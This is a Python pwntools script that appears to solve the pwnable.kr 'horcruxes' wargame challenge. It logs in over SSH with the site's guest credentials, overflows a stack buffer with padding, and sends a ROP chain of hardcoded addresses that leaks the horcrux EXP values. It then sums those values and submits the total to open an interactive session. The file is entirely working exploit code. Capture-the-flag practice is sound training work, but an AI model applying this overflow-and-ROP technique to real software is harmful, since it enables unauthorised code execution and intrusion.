from pwn import *
from pwnlib.util.packing import p32
import re

# context.update(arch="amd64", os="linux", bits=64)
s =  ssh(host='pwnable.kr',
         port=2222,
         user='horcruxes',
         password='guest'
        )
p = s.connect_remote('localhost', 9032)

p.recvuntil("Select Menu:")
p.send("123\n")
p.recvuntil("How many EXP did you earned? : ")

a = p32(0x809fe4b)
b = p32(0x809fe6a)
c = p32(0x809fe89)
d = p32(0x809fea8)
e = p32(0x809fec7)
f = p32(0x809fee6)
g = p32(0x809ff05)
call_ropme = p32(0x0809fffc) # 0x809fffc <main+216>:        call   0x80a0009 <ropme>
payload = a + b + c + d + e + f + g + call_ropme
# raw_input()
p.send("A" * 0x74 + "BBBB")
p.send(payload)
p.send("\n")

encoding = "utf-8"
data = p.recvuntil("Select Menu:")
data = data.decode(encoding)
print(data)
data = data.strip().split('\n')
exps = [h for h in data if 'EXP' in h]
sums = 0
for exp in exps:
        if "+-" in exp:
                sums -= int(re.findall(r'\d+', exp)[0]) & 0xffffffff
        else:
                sums += int(re.findall(r'\d+', exp)[0]) & 0xffffffff

sums = sums & 0xffffffff
print("sum:", sums)

p.send('123\n')
p.recvuntil("How many EXP did you earned? : ")
p.send(str(sums) + "\n")
p.interactive()
p.close()
